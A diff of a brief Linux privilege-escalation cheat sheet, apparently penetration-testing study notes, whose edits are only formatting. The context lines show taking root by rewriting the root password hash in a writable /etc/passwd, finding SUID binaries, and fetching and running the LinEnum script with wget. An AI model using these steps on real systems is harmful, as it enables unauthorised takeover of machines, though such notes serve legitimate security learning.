@@ -17,7 +17,7 @@ ls -l /etc/shadow					is /etc/shadow writable?
 <!-- -->
 
 			 	Writable /etc/passwd
-ls -l /etc/passwd					is /etc/passwd writeable?
+`ls -l /etc/passwd`					is /etc/passwd writeable?
 - openssl passwd password			      Generate password hash
 - place the new password hash between the first and second colon (:) of the root user's row (replacing the "x").
 - su root							      switch to root
@@ -38,6 +38,8 @@ Find all Suids `find / -perm -u=s -type f 2>/dev/null`
 				LinEnum
 -- wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 -- ./LinEnum.sh -t -r report.txt
+
+
 
 				Misc
 -- https://gtfobins.github.io/
